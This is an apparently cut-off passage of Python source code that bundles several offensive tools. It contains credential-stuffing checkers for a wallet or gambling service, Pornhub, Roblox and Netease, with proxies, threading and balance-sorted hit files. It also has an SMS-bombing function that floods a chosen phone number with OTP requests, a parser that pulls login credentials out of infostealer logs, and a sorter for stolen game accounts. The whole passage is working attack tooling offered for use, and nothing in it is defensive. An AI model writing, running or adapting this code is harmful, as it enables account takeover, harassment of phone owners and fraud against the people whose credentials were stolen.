                    print(f"{Fore.GREEN}[+] HIT: {combo} | Balance: {balance:.2f}{Style.RESET_ALL}")
                    self.save_hit(combo, hit_info)
                else:
                    self.hits += 1
                    print(f"{Fore.GREEN}[+] HIT: {combo} | No wallet info{Style.RESET_ALL}")
                    self.save_no_wallet_info(combo)

            elif "NotAuthorizedException" in auth_response.text or "UserNotFoundException" in auth_response.text:
                self.fails += 1
                print(f"{Fore.RED}[-] FAIL: {combo}{Style.RESET_ALL}")
                self.save_fail(combo)

            elif "ForbiddenException" in auth_response.text:
                self.banned += 1
                print(f"{Fore.YELLOW}[!] BANNED: {combo} | Cooldown {self.cooldown_time}s{Style.RESET_ALL}")
                self.save_banned(combo)
                time.sleep(self.cooldown_time)

            else:
                self.retries += 1
                print(f"{Fore.BLUE}[?] RETRY: {combo} | Unknown response{Style.RESET_ALL}")

        except Exception as e:
            self.retries += 1
            print(f"{Fore.RED}[!] ERROR: {combo} | {str(e)}{Style.RESET_ALL}")
    
    def sort_and_separate_by_balance(self):
        hits_path = self.hits_file
        if os.path.exists(hits_path):
            with open(hits_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            accounts = []
            for line in lines:
                try:
                    if 'Balance = ' in line:
                        balance = float(line.split('Balance = ')[1].split(' |')[0])
                        accounts.append((balance, line))
                except:
                    continue

            accounts.sort(reverse=True, key=lambda x: x[0])

            sorted_path = f'results/sorted/balance_sorted_{self.time_now}.txt'
            with open(sorted_path, 'w', encoding='utf-8') as f:
                f.write("Accounts Sorted by Balance (Highest to Lowest):\n\n")
                for balance, line in accounts:
                    f.write(line)
    
    def start(self):
        self.print_logo()
        combos = self.load_combos()
        total = len(combos)
        use_proxies = input(f"{Fore.YELLOW}[+] Use proxies? (y/n): {Style.RESET_ALL}").lower() == 'y'
        if use_proxies:
            self.load_proxies()

        while True:
            try:
                threads = int(input(f"{Fore.YELLOW}[+] Enter number of threads (1-200): {Style.RESET_ALL}"))
                if 1 <= threads <= 200:
                    break
                else:
                    print(f"{Fore.RED}[-] Please enter a number between 1 and 200{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[-] Please enter a valid number{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[+] Loaded {total} combos{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Starting checker with {threads} threads...{Style.RESET_ALL}\n")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.check_account, combos)

        print(f"\n{Fore.GREEN}[+] Checking completed!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Sorting and organizing results...{Style.RESET_ALL}")
        self.sort_and_separate_by_balance()

        print(f"""
{Fore.CYAN}Results Summary:
• Hits: {Fore.GREEN}{self.hits}{Fore.CYAN}
• Fails: {Fore.RED}{self.fails}{Fore.CYAN}
• Banned: {Fore.YELLOW}{self.banned}{Fore.CYAN}
• Retries: {Fore.BLUE}{self.retries}{Fore.CYAN}
• Results saved and sorted in respective folders
{Style.RESET_ALL}
""")
        input(f"{Fore.YELLOW}[+] Press Enter to continue...{Style.RESET_ALL}")

    def menu(self):
        while True:
            self.print_logo()
            print(f"""
{Fore.CYAN}Options:
[1] Info Check Accounts
[2] Validate Proxies
[3] Enter Cooldown Seconds
[4] Exit
{Style.RESET_ALL}
""")
            choice = input(f"{Fore.YELLOW}Enter your choice (1-4): {Style.RESET_ALL}")
            if choice == '1':
                self.start()
            elif choice == '2':
                self.load_proxies()
                self.validate_proxies()
            elif choice == '3':
                try:
                    self.cooldown_time = int(input(f"{Fore.YELLOW}Enter cooldown seconds: {Style.RESET_ALL}"))
                    print(f"{Fore.GREEN}[+] Cooldown set to {self.cooldown_time} seconds{Style.RESET_ALL}")
                except:
                    print(f"{Fore.RED}[-] Invalid input! Using default cooldown.{Style.RESET_ALL}")
            elif choice == '4':
                print(f"{Fore.GREEN}[+] Thanks for using! Goodbye!{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
           

URL = "https://api.s5.com/player/api/v1/otp/request"
HEADERS = {
    "accept": "application/json, text/plain, */*",
    "x-public-api-key": "d6a6d988-e73e-4402-8e52-6df554cbfb35",
    "x-api-type": "external",
    "x-locale": "en",
    "x-timezone-offset": "480",
    "origin": "https://www.s5.com",
    "referer": "https://www.s5.com/",
    "user-agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/141.0.0.0 Safari/537.36"
    ),
}
DELAY_BETWEEN_REQUESTS = 2.0
REQUEST_TIMEOUT = 10


def send_otp_once(phone: str) -> requests.Response:
    files = {"phone_number": (None, phone)}
    return requests.post(URL, headers=HEADERS, files=files, timeout=REQUEST_TIMEOUT)


def prompt_phone() -> str:
    phone = input(f"{Fore.CYAN}Enter target phone number (e.g. +639XXXXXXXXX): {Style.RESET_ALL}").strip()
    while not phone:
        print("Phone number cannot be empty. Try again.")
        phone = input(f"{Fore.CYAN}Enter target phone number (e.g. +639XXXXXXXXX): {Style.RESET_ALL}").strip()
    return phone


def prompt_count() -> int:
    while True:
        raw = input(f"{Fore.CYAN}How many OTPs do you want to send? {Style.RESET_ALL}").strip()
        try:
            n = int(raw)
            if n < 0:
                print("Please enter a non-negative integer.")
                continue
            return n
        except ValueError:
            print("Please enter a valid integer.")

def sms_bomb():
    """
    Sends repeated OTP requests to the target phone using the configured endpoint.
    """
    phone = prompt_phone()
    count = prompt_count()

    if count == 0:
        print("Count is 0 — nothing to send. Exiting.")
        return

    print(f"Sending {count} OTP request(s) to {phone} (delay {DELAY_BETWEEN_REQUESTS}s)...")
    for i in range(1, count + 1):
        try:
            resp = send_otp_once(phone)
            
            status = getattr(resp, "status_code", "N/A")
            text = getattr(resp, "text", "")
            print(f"[{i}/{count}] {status} - {text}")
        except requests.RequestException as e:
            print(f"[{i}/{count}] Request error: {e}")
        if i < count:
            time.sleep(DELAY_BETWEEN_REQUESTS)

    print("Finished.")

def parse_block_universal(block):
    """
    Parse any account block in any format.
    Returns a dictionary with:
      - 'level': int
      - 'status_clean': 'clean' or 'not clean'
      - 'lines': all original lines
    """
    account = {"level": 0, "status_clean": "not clean", "lines": block.copy()}

    for line in block:
        line = line.strip()
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        key = key.strip().lower()
        value = value.strip().lower()

        
        if "level" in key:
            nums = re.findall(r"\d+", value)
            if nums:
                account["level"] = int(nums[0])

        
        if any(w in value for w in ["not clean", "suspicious", "2fa", "bound", "warning", "locked"]):
            account["status_clean"] = "not clean"
        elif "clean" in value:
            account["status_clean"] = "clean"

    return account
    
def read_accounts_universal(file_path):
    """
    Reads accounts from a text file.
    Each account block is separated by empty lines.
    """
    accounts = []
    with open(file_path, "r", encoding="utf-8") as f:
        block = []
        for line in f:
            if line.strip() == "":
                if block:
                    acc = parse_block_universal(block)
                    if acc["level"] is not None:
                        accounts.append(acc)
                    block = []
            else:
                block.append(line.rstrip())
        # last block
        if block:
            acc = parse_block_universal(block)
            if acc["level"] is not None:
                accounts.append(acc)
    return accounts

def write_accounts_universal(accounts):
    """
    Write accounts into 6 files: 200/300/400 and clean/not clean.
    """
    files = {
        "200_clean": open("accounts_200_clean.txt", "w", encoding="utf-8"),
        "200_not_clean": open("accounts_200_not_clean.txt", "w", encoding="utf-8"),
        "300_clean": open("accounts_300_clean.txt", "w", encoding="utf-8"),
        "300_not_clean": open("accounts_300_not_clean.txt", "w", encoding="utf-8"),
        "400_clean": open("accounts_400_clean.txt", "w", encoding="utf-8"),
        "400_not_clean": open("accounts_400_not_clean.txt", "w", encoding="utf-8"),
    }

    try:
        for account in accounts:
            level = account.get("level", 0)
            status = account.get("status_clean", "not clean")

            if level < 300:
                key = "200_clean" if status == "clean" else "200_not_clean"
            elif level < 400:
                key = "300_clean" if status == "clean" else "300_not_clean"
            else:
                key = "400_clean" if status == "clean" else "400_not_clean"

            files[key].write("\n".join(account["lines"]) + "\n\n")
    finally:
        for f in files.values():
            f.close()


def codm_sep():
    while True:
        file_path = input("Enter your account .txt file path for CODM SEP: ").strip()
        if not os.path.isfile(file_path):
            print(f"❌ File not found: {file_path}. Try again.")
        else:
            break

    accounts = read_accounts_universal(file_path)
    if not accounts:
        print("❌ No valid accounts found!")
        return

    write_accounts_universal(accounts)
    print("✅ Accounts have been separated by level (200/300/400) and Clean/Not Clean status into 6 files.")



def call_if_exists(name, *args, **kwargs):
    """
    Try to call a function/class by name from globals() if it exists.
    Useful for integrating with user-defined components that may already exist.
    """
    obj = globals().get(name)
    if callable(obj):
        return obj(*args, **kwargs)
    else:
        console.print(Panel(f"[red]'{name}' not found. Make sure it's defined in your code.[/red]"))
        return None

def read_banner():
    if os.path.exists(shamp_file):
        with open(shamp_file, "r", encoding="utf-8") as f:
            return f.read()
    return ""

def load_selected_font():
    if os.path.exists(FONT_FILE):
        with open(FONT_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    return None

def save_selected_font(font_name):
    with open(FONT_FILE, "w", encoding="utf-8") as f:
        f.write(font_name)

def display_banner():
    try:
        available_fonts = pyfiglet.getFonts()
    except AttributeError:
        from pyfiglet import FigletFont
        available_fonts = FigletFont.getFonts()

    stored_font = load_selected_font()
    if stored_font and stored_font in available_fonts:
        selected_font = stored_font
    else:
        print(Fore.YELLOW + "🔹 Available Fonts: " + ", ".join(available_fonts[:10]) + " ... (more available)")
        selected_font = input(Fore.CYAN + "🔹 Enter font name (or press Enter for default 'slant'): ").strip()
        if selected_font not in available_fonts:
            print(Fore.RED + f"⚠ Invalid font! Using default 'slant'.")
            selected_font = "slant"
        save_selected_font(selected_font)

    try:
        banner = pyfiglet.figlet_format("LOGS TO TXT", font=selected_font)
    except Exception:
        print(Fore.RED + "⚠ Font rendering failed! Using default 'slant'.")
        banner = pyfiglet.figlet_format("LOGS TO TXT", font="slant")

    print(Fore.GREEN + banner)
    print(Fore.YELLOW + "🔹 Created by: Shampu - @findmebro")
    print(Fore.CYAN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

def get_all_files(directory):
    all_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files

def extract_credentials_from_text(text):
    patterns = [
        r"URL:\s*(https?://\S+)\s+USER:\s*(\S+)\s+PASS:\s*(\S+)",
        r"SOFT:\s*Chrome Profile.*\nURL:\s*(\S+)\nUSER:\s*(\S+)\nPASS:\s*(\S+)",
        r"SOFT:\s*(.*?)\s*URL:\s*(\S+)\s*USER:\s*(\S+)\s*PASS:\s*(\S+)",
        r"USER:\s*(\S+)\s*PASS:\s*(\S+)"
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return ":".join(match.groups())
    return None

def get_unique_filename(folder, base_name):
    index = 1
    while True:
        file_name = f"{base_name}{index}.txt"
        full_path = os.path.join(folder, file_name)
        if not os.path.exists(full_path):
            return full_path
        index += 1

def extract_and_merge_logs(input_folder):
    output_folder = "Processed_Results"
    os.makedirs(output_folder, exist_ok=True)

    custom_name = input(Fore.YELLOW + "📂 Enter results filename (Press Enter for default 'results'): ").strip()
    base_filename = custom_name if custom_name else "results"

    output_file = get_unique_filename(output_folder, base_filename)
    error_file = get_unique_filename(output_folder, "error")

    valid_credentials = set()
    duplicate_credentials = set()
    total_valid, total_errors, total_duplicates = 0, 0, 0

    all_files = get_all_files(input_folder)
    total_files = len(all_files)
    processed_files = 0

    print("\n📡 " + Fore.GREEN + "LIVE SEARCHING...")
    print(Fore.CYAN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(Fore.YELLOW + "VALID  |  ERROR  |  DUPLICATE  |  PROGRESS")
    print(Fore.CYAN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    with open(error_file, "w", encoding="utf-8") as err_file:
        for file_path in all_files:
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    credentials = extract_credentials_from_text(content)

                    if credentials:
                        if credentials in valid_credentials:
                            duplicate_credentials.add(credentials)
                            total_duplicates += 1
                        else:
                            valid_credentials.add(credentials)
                            total_valid += 1
                    else:
                        err_file.write(f"❌ No credentials found: {file_path}\n")
                        total_errors += 1

            except Exception as e:
                err_file.write(f"❌ Failed to read: {file_path} - Error: {e}\n")
                total_errors += 1

            processed_files += 1
            progress = (processed_files / total_files) * 100 if total_files else 100
            print(f"\r{Fore.GREEN}{total_valid:<6} | {Fore.RED}{total_errors:<6} | {Fore.YELLOW}{total_duplicates:<6} | {Fore.BLUE}{progress:.2f}%   ", end="", flush=True)

    banner_content = read_banner()
    with open(output_file, "w", encoding="utf-8") as out:
        out.write(banner_content + "\n")
        out.write("\n".join(valid_credentials) + "\n")
    
    if duplicate_credentials:
        duplicate_file = get_unique_filename(output_folder, "duplicates")
        with open(duplicate_file, "w", encoding="utf-8") as dup:
            dup.write(banner_content + "\n")
            dup.write("\n".join(duplicate_credentials) + "\n")
        print(Fore.YELLOW + f"\n⚠️ Duplicate credentials saved in `{duplicate_file}`")

    print(Fore.CYAN + "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(Fore.GREEN + f"\n✅ Credentials saved in `{output_file}`")
    print(Fore.RED + f"⚠️ Errors saved in `{error_file}`" if total_errors else Fore.GREEN + "✅ No errors found!")

def extract_files(file_path, output_folder):
    try:
        archive_name = os.path.splitext(os.path.basename(file_path))[0]
        extract_folder = os.path.join(output_folder, archive_name)
        os.makedirs(extract_folder, exist_ok=True)

        if file_path.endswith('.zip'):
            with zipfile.ZipFile(file_path) as zip_ref:
                if any(zip_info.flag_bits & 0x1 for zip_info in zip_ref.infolist()):
                    while True:
                        password = input(Fore.YELLOW + f"🔑 Enter password for {file_path}: ").strip()
                        try:
                            zip_ref.extractall(extract_folder, pwd=password.encode('utf-8'))
                            print(Fore.GREEN + f"✅ Extracted {file_path} to {extract_folder}")
                            break
                        except RuntimeError:
                            print(Fore.RED + f"❌ Incorrect password for {file_path}. Please try again.")
                else:
                    zip_ref.extractall(extract_folder)
                    print(Fore.GREEN + f"✅ Extracted {file_path} to {extract_folder}")
        elif file_path.endswith(('.tar', '.tar.gz', '.tar.bz2')):
            with tarfile.open(file_path) as tar_ref:
                tar_ref.extractall(extract_folder)
            print(Fore.GREEN + f"✅ Extracted {file_path} to {extract_folder}")
        else:
            subprocess.run(["7z", "x", file_path, f"-o{extract_folder}", "-p"], check=True)
            print(Fore.GREEN + f"✅ Extracted {file_path} to {extract_folder}")

        print(Fore.CYAN + "\n🔍 Processing extracted files...")
        extract_and_merge_logs(extract_folder)
    except Exception as e:
        print(Fore.RED + f"❌ Failed to extract {file_path}: {e}")

def run_logs_to_txt():
    display_banner()
    current_directory = os.getcwd()
    contents = os.listdir(current_directory)
    files_and_folders = []

    for item in contents:
        full_path = os.path.join(current_directory, item)
        if os.path.isdir(full_path):
            files_and_folders.append((item, "Folder"))
        else:
            files_and_folders.append((item, "File"))

    if not files_and_folders:
        print(Fore.RED + "❌ No files or folders found in the current directory!")
        return

    print(Fore.YELLOW + "\n📂 Available Files and Folders:")
    for idx, (name, type_) in enumerate(files_and_folders, start=1):
        print(Fore.CYAN + f"{idx}. {name} ({type_})")

    try:
        choice = int(input("\n🔹 Enter the number of the item to process: ")) - 1
        if 0 <= choice < len(files_and_folders):
            selected_item = files_and_folders[choice][0]
            selected_path = os.path.join(current_directory, selected_item)
            if files_and_folders[choice][1] == "Folder":
                extract_and_merge_logs(selected_path)
            else:
                output_folder = os.path.join(current_directory, "Extracted_Files")
                os.makedirs(output_folder, exist_ok=True)
                extract_files(selected_path, output_folder)
        else:
            print(Fore.RED + "❌ Invalid selection!")
    except ValueError:
        print(Fore.RED + "❌ Please enter a valid number!")
        
class PornHubChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.pornhub.com"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Accept": "*/*", 
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        self.hits = []
        self.fails = []
        self.accounts_info = []

    def login(self, email, password):
        try:
            
            response = self.session.get(f"{self.base_url}/", headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            token = soup.find('input', {'name': 'token'})['value']
            redirect = soup.find('a', href=lambda x: x and 'login?redirect=' in x)['href'].split('login?redirect=')[1]

            login_data = {
                'redirect': redirect,
                'token': token,
                'from': 'pc_login_modal_:index',
                'username': email,
                'email': email,
                'password': password,
                'remember_me': 'on'
            }

            response = self.session.post(
                f"{self.base_url}/front/authenticate",
                data=login_data,
                headers={**self.headers, 'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )

            result = response.json()
            if result.get('success') == '1':
                return True
            return False

        except Exception as e:
            return False

    def get_user_info(self, email):
        try:
            profile_info = {'Email': email}
            
            
            response = self.session.get(f"{self.base_url}/users/dashboard", headers=self.headers, timeout=10)
            if response.status_code != 200:
                return profile_info
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            
            username_elem = soup.find('a', {'class': 'username'})
            if username_elem:
                profile_info['Username'] = username_elem.text.strip()
                
            
            premium_elem = soup.find('div', {'class': 'premium-icon'})
            profile_info['Premium Status'] = 'Premium' if premium_elem else 'Free'
            
            if premium_elem:
                
                premium_info = self.get_premium_info()
                profile_info.update(premium_info)
            
            
            views_elem = soup.find('dt', string='Profile Views:')
            if views_elem and views_elem.find_next('dd'):
                profile_info['Profile Views'] = views_elem.find_next('dd').text.strip()
                
            
            login_elem = soup.find('dt', string='Last Login:')
            if login_elem and login_elem.find_next('dd'):
                profile_info['Last Login'] = login_elem.find_next('dd').text.strip()
                
            
            country_elem = soup.find('dt', string='Country:')
            if country_elem and country_elem.find_next('dd'):
                profile_info['Country'] = country_elem.find_next('dd').text.strip().strip('"')
                
            
            videos_elem = soup.select_one('#profileMenuDropdown span.floatRight')
            if videos_elem:
                profile_info['Videos Watched'] = videos_elem.text.strip()

            
            profile_info.update(self.get_additional_info())

            return profile_info

        except Exception as e:
            print(f"{Fore.RED}[!] Error getting user info: {str(e)}{Style.RESET_ALL}")
            return {'Email': email}

    def get_premium_info(self):
        try:
            premium_info = {}
            response = self.session.get(f"{self.base_url}/premium/manage", headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            
            sub_type = soup.find('div', {'class': 'premiumUpgradeHeader'})
            if sub_type:
                premium_info['Premium Type'] = sub_type.text.strip()
            
            
            exp_date = soup.find('div', {'class': 'expirationDate'})
            if exp_date:
                premium_info['Premium Expiration'] = exp_date.text.strip()
                
            return premium_info
        except:
            return {}

    def get_additional_info(self):
        try:
            additional_info = {}
            
            
            response = self.session.get(f"{self.base_url}/playlists/manage", headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            playlists = soup.find_all('div', {'class': 'playlistWrapper'})
            additional_info['Playlists Count'] = len(playlists) if playlists else 0
            
            
            response = self.session.get(f"{self.base_url}/users/favorites", headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            favorites = soup.find('div', {'class': 'showingCounter'})
            if favorites:
                additional_info['Favorites Count'] = favorites.text.strip().split(' ')[0]
            
            
            response = self.session.get(f"{self.base_url}/users/comments", headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            comments = soup.find('div', {'class': 'showingCounter'})
            if comments:
                additional_info['Comments Count'] = comments.text.strip().split(' ')[0]
                
            return additional_info
        except:
            return {}

    def save_results(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if not os.path.exists("results"):
            os.makedirs("results")

        
        if self.hits:
            with open(f"results/hits_{timestamp}.txt", "w", encoding='utf-8') as f:
                for account_info in self.accounts_info:
                    f.write(f"{'='*50}\n")
                    f.write(f"Account: {account_info['credentials']}\n")
                    f.write(f"{'='*50}\n")
                    
                    for key, value in account_info['profile'].items():
                        f.write(f"{key}: {value}\n")
                    f.write("\n")

        
        if self.fails:
            with open(f"results/fails_{timestamp}.txt", "w", encoding='utf-8') as f:
                for fail in self.fails:
                    f.write(f"{fail}\n")

    def check_account(self, email, password):
        print(f"\n{Fore.YELLOW}[*] Checking {email}:{password}{Style.RESET_ALL}")
        
        if self.login(email, password):
            print(f"{Fore.GREEN}[+] Valid Account! {email}:{password}{Style.RESET_ALL}")
            
            profile_info = self.get_user_info(email)
            if profile_info:
                print(f"\n{Fore.CYAN}[*] Account Information:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
                for key, value in profile_info.items():
                    print(f"{Fore.WHITE}{key}: {value}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{'='*50}{Style.RESET_ALL}")
            
            
            account_info = {
                'credentials': f"{email}:{password}",
                'profile': profile_info
            }
            self.accounts_info.append(account_info)
            self.hits.append(f"{email}:{password}")
                
        else:
            print(f"{Fore.RED}[-] Invalid Account! {email}:{password}{Style.RESET_ALL}")
            self.fails.append(f"{email}:{password}")

def read_file_safely(filename):
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            with codecs.open(filename, 'r', encoding=encoding) as f:
                return f.readlines()
        except UnicodeDecodeError:
            continue
    
    
    try:
        with open(filename, 'rb') as f:
            return [line.decode('utf-8', errors='ignore').strip() for line in f.readlines()]
    except:
        raise Exception("Could not read file with any encoding")

def ph_main():
    print(f"""{Fore.RED}
    ╔═╗┌─┐┬─┐┌┐┌╦ ╦┬ ┬┌┐ ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
    ╠═╝│ │├┬┘││││ ││ │├┴┐║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
    ╩  └─┘┴└─┘└┘╚═╝└─┘└─┘╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
    {Style.RESET_ALL}""")
    print(f"{Fore.CYAN}Created by @OchoOcho21 | Version 1.2.2{Style.RESET_ALL}\n")

    checker = PornHubChecker()
    
    while True:
        print(f"\n{Fore.YELLOW}1. Check single account")
        print(f"2. Check accounts from file")
        print(f"3. Exit{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.CYAN}Choose an option: {Style.RESET_ALL}")
        
        if choice == "1":
            email = input(f"\n{Fore.YELLOW}Enter email: {Style.RESET_ALL}")
            password = input(f"{Fore.YELLOW}Enter password: {Style.RESET_ALL}")
            checker.check_account(email, password)
            checker.save_results()
            
        elif choice == "2":
            filename = input(f"\n{Fore.YELLOW}Enter accounts file path: {Style.RESET_ALL}")
            
            if not os.path.exists(filename):
                print(f"{Fore.RED}[!] File not found!{Style.RESET_ALL}")
                continue
                
            try:
                accounts = read_file_safely(filename)
                total = len(accounts)
                print(f"\n{Fore.CYAN}[*] Loaded {total} accounts{Style.RESET_ALL}")
                
                for i, account in enumerate(accounts, 1):
                    try:
                        account = account.strip()
                        if ':' not in account:
                            print(f"{Fore.RED}[!] Invalid format: {account}{Style.RESET_ALL}")
                            continue
                            
                        email, password = account.split(':')
                        print(f"\n{Fore.YELLOW}[*] Checking account {i}/{total}{Style.RESET_ALL}")
                        checker.check_account(email, password)
                        time.sleep(1)
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error checking account: {account} - {str(e)}{Style.RESET_ALL}")
                        
                checker.save_results()
                print(f"\n{Fore.GREEN}[+] Results saved in results folder{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Error reading file: {str(e)}{Style.RESET_ALL}")
            
        elif choice == "3":
            break
            
        else:
            print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
            
import requests
import sys
from datetime import datetime
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed


class RobloxChecker:
    def __init__(self):
        self.hit = 0
        self.failed = 0
        self.done = 0
        self.total = 0
        self.results = []

    def parse_date(self, date_str):
        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"]
        for fmt in formats:
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d")
            except ValueError:
                continue
        return "Unknown Date"

    def get_roblox_user_info(self, username):
        try:
            user_lookup_url = "https://users.roblox.com/v1/usernames/users"
            response = requests.post(user_lookup_url, json={"usernames": [username]}, timeout=8)
            response.raise_for_status()
            data = response.json().get("data", [])
            if not data:
                return None
            user_id = data[0]["id"]

            # fetch more user data
            profile = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=8).json()
            friends = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=8).json().get("count", 0)
            followers = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", timeout=8).json().get("count", 0)
            badges = requests.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", timeout=8).json().get("data", [])
            groups = requests.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=8).json()
            collectibles = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10", timeout=8).json().get("data", [])
            avatar = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png"

            return {
                "UserID": user_id,
                "Username": profile.get("name"),
                "DisplayName": profile.get("displayName"),
                "ProfileURL": f"https://www.roblox.com/users/{user_id}/profile",
                "Description": profile.get("description", "N/A"),
                "IsBanned": profile.get("isBanned", False),
                "AccountAgeDays": profile.get("age"),
                "JoinDate": self.parse_date(profile.get("created")),
                "BadgeCount": len(badges),
                "CollectibleCount": len(collectibles),
                "GroupCount": len(groups),
                "FriendCount": friends,
                "FollowerCount": followers,
                "Avatar": avatar
            }

        except Exception:
            return None

    def process_account(self, username, password):
        info = self.get_roblox_user_info(username)
        self.done += 1
        if info:
            self.hit += 1
            block = "\n".join([f"[+] {key}: {val}" for key, val in info.items()])
            self.results.append(f"USERNAME: {username}\nPASSWORD: {password}\n{block}\n\n")
        else:
            self.failed += 1

        # Update display (overwrite same lines)
        sys.stdout.write(
            f"\033[F\033[F"  # move cursor up 2 lines
            f"[{self.done}/{self.total}]\n"
            f"Hit {self.hit} | Failed {self.failed}\n"
        )
        sys.stdout.flush()

    def run(self):
        file_name = input("Enter file: ").strip()

        try:
            with open(file_name, "r") as file:
                lines = [line.strip() for line in file if ":" in line]

            accounts = [(u.strip(), p.strip()) for u, p in (line.split(":", 1) for line in lines)]
            self.total = len(accounts)

            print(colored("Roblox Checking", "cyan", attrs=["bold"]))
            print("_______________")
            print(f"[0/{self.total}]")
            print("Hit 0 | Failed 0")
            print("_______________")

            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = [executor.submit(self.process_account, u, p) for u, p in accounts]
                for _ in as_completed(futures):
                    pass  # progress display is handled live

            # Save full data
            output_file_name = "XYTHIN_roblox_results.txt"
            with open(output_file_name, "w", encoding="utf-8") as f:
                f.write("Created by Xythin\n\n")
                for result in self.results:
                    f.write(result)

            print("_______________")
            print(colored(f"✅ Done! Saved full info to '{output_file_name}'", "green", attrs=["bold"]))

        except FileNotFoundError:
            print(colored("❌ File not found!", "red", attrs=["bold"]))
        except Exception as e:
            print(colored(f"❌ Error: {e}", "red", attrs=["bold"]))
           
class NeteaseGamesChecker:
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.success = 0
        self.failed = 0 
        self.invalid_pass = 0
        self.errors = 0
        self.counter_lock = threading.Lock()
        self.file_lock = threading.Lock()
        
        self.banner = f"""{Fore.CYAN}
▄▄▄       ▄▄▄       ██▀███   ▒█████   ███▄    █ 
▒████▄    ▒████▄    ▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ 
▒██  ▀█▄  ▒██  ▀█▄  ▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
░██▄▄▄▄██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
 ▓█   ▓██▒ ▓█   ▓██▒░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
 ▒▒   ▓▒█░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ▒   ▒▒ ░  ▒   ▒▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ▒     ░   ▒     ░░   ░ ░ ░ ░ ▒     ░   ░ ░ 
      ░  ░      ░  ░   ░         ░ ░           ░ 

       Advanced Netease Account Checker v1.0                            
       [Netease Account Checker]                   
       Created By : @OchoOcho21
{Style.RESET_ALL}"""

    def get_md5(self, password):
        return hashlib.md5(password.encode()).hexdigest()
        
    def get_random_ua(self):
        return self.ua.random
        
    def save_results(self, result_type, account, extra=""):
        with self.file_lock:
            with open(f"{result_type}.txt", "a") as f:
                f.write(f"{account} {extra}\n")
            
    def check_account(self, account_data):
        try:
            email, password = account_data.split(":")
            email = email.strip()
            password = password.strip()
            
            md5_pwd = self.get_md5(password)
            random_ua = self.get_random_ua()
            
            login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
            login_data = {
                "account": email,
                "hash_password": md5_pwd,
                "client_id": "official",
                "response_type": "cookie",
                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                "state": "official_state"
            }
            
            headers = {
                "Pragma": "no-cache",
                "Accept": "*/*",
                "User-Agent": random_ua,
            }
            
            r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
            response = r.json()

            # Save raw responses for debugging
            with self.file_lock:
